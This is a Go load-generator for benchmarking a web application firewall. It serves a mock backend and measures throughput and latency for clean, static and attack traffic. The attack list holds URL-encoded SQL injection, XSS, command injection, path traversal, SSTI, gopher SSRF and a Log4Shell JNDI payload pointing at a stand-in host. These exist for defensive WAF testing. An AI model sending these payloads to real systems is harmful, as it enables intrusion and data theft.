// loadgen 是 WAF 数据面的压测工具（P1-5 交付物，基准重跑用）。
//
// 两种模式：
//
//	go run ./tools/loadgen -mode backend -addr 127.0.0.1:18080   # 1.6KB HTML 模拟上游
//	go run ./tools/loadgen -mode load -url http://127.0.0.1:18081/ \
//	    -c 64 -dur 15s -scenario clean                            # 压测
//
// scenario：
//   - clean  ：GET /（命中 1.6KB HTML，走全引擎检测后转发）
//   - attack ：GET /search?q=<轮换攻击 payload>（应被 403/429 拦截）
//   - static ：GET /app.js（静态资源，CRS 闸门应旁路）
//
// 输出：总请求、吞吐 RPS、p50/p90/p99 时延、2xx/4xx/错误分布。
// 压测口径与 docs/v1.6.0-与雷池社区版对比.md 相同（回环 / keep-alive / 无 TLS）。
package main

import (
	"flag"
	"fmt"
	"net/http"
	"os"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var htmlPayload = "<!DOCTYPE html><html><head><title>bench</title></head><body>" +
	strings.Repeat("<p>benchmark payload line for 1.6KB response body measurement.</p>", 22) +
	"</body></html>"

var jsPayload = "/*! bench static asset */" + strings.Repeat("window.bench=function(){return 1};", 40)

// attacks 攻击场景轮换的 payload（url 编码态，命中自研规则/语义通道/CRS）。
var attacks = []string{
	"/search?q=1%27%20union%20select%20null%2Cnull%2Cnull--%20-",
	"/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
	"/search?q=%3Bwhoami",
	"/search?q=..%2F..%2F..%2Fetc%2Fpasswd",
	"/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fx%7D",
	"/search?q=%7B%7B7*7%7D%7D",
	"/search?q=1%20and%20sleep(5)--%20-",
	"/search?q=gopher%3A%2F%2F127.0.0.1%3A6379%2F_INFO",
}

func main() {
	mode := flag.String("mode", "load", "backend | load")
	addr := flag.String("addr", "127.0.0.1:18080", "backend 模式监听地址")
	urlStr := flag.String("url", "http://127.0.0.1:18081/", "load 模式目标")
	conc := flag.Int("c", 64, "并发连接数")
	dur := flag.Duration("dur", 15*time.Second, "压测时长")
	scenario := flag.String("scenario", "clean", "clean | attack | static")
	flag.Parse()

	if *mode == "backend" {
		runBackend(*addr)
		return
	}
	runLoad(*urlStr, *conc, *dur, *scenario)
}

// runBackend 模拟上游：/（HTML）、/app.js（静态）、其余 404。
func runBackend(addr string) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/app.js" {
			w.Header().Set("Content-Type", "application/javascript")
			fmt.Fprint(w, jsPayload)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprint(w, htmlPayload)
	})
	srv := &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}
	fmt.Printf("mock backend listening on %s\n", addr)
	if err := srv.ListenAndServe(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

// runLoad 并发压测并输出统计。
func runLoad(urlStr string, conc int, dur time.Duration, scenario string) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:        conc * 2,
			MaxIdleConnsPerHost: conc * 2,
			IdleConnTimeout:     90 * time.Second,
		},
	}

	var total, ok2xx, ok4xx, errors atomic.Int64
	var latencies sync.Mutex
	var lats []time.Duration
	stop := make(chan struct{})
	var wg sync.WaitGroup

	targetFor := func(i int64) string {
		if scenario == "attack" {
			return urlStr + attacks[i%int64(len(attacks))]
		}
		if scenario == "static" {
			return strings.TrimSuffix(urlStr, "/") + "/app.js"
		}
		return urlStr
	}

	worker := func(id int) {
		defer wg.Done()
		var i int64 = int64(id)
		for {
			select {
			case <-stop:
				return
			default:
			}
			i++
			start := time.Now()
			req, _ := http.NewRequest(http.MethodGet, targetFor(i), nil)
			// 浏览器 UA：Go 默认 UA 会被 bot-cli-tool 规则挑战（那是正确行为，
			// 压测模拟的是正常访客流量）
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
			resp, err := client.Do(req)
			elapsed := time.Since(start)
			if err != nil {
				errors.Add(1)
				continue
			}
			// 读掉 body（keep-alive 复用需要）
			buf := make([]byte, 4096)
			for {
				if _, err := resp.Body.Read(buf); err != nil {
					break
				}
			}
			resp.Body.Close()
			if resp.StatusCode >= 200 && resp.StatusCode < 300 {
				ok2xx.Add(1)
			} else {
				ok4xx.Add(1)
			}
			latencies.Lock()
			lats = append(lats, elapsed)
			latencies.Unlock()
			total.Add(1)
		}
	}

	for i := 0; i < conc; i++ {
		wg.Add(1)
		go worker(i)
	}
	wallStart := time.Now()
	time.Sleep(dur)
	close(stop)
	wg.Wait()
	wall := time.Since(wallStart)

	// 统计分位数
	latencies.Lock()
	sort.Slice(lats, func(i, j int) bool { return lats[i] < lats[j] })
	pct := func(p float64) string {
		if len(lats) == 0 {
			return "-"
		}
		idx := int(float64(len(lats)) * p)
		if idx >= len(lats) {
			idx = len(lats) - 1
		}
		return fmt.Sprintf("%.2fms", float64(lats[idx].Microseconds())/1000)
	}
	latencies.Unlock()

	fmt.Printf("== loadgen (%s, c=%d, %.0fs) ==\n", scenario, conc, wall.Seconds())
	fmt.Printf("requests=%d rps=%.0f\n", total.Load(), float64(total.Load())/wall.Seconds())
	fmt.Printf("2xx=%d 4xx=%d errors=%d\n", ok2xx.Load(), ok4xx.Load(), errors.Load())
	fmt.Printf("p50=%s p90=%s p99=%s\n", pct(0.50), pct(0.90), pct(0.99))
}
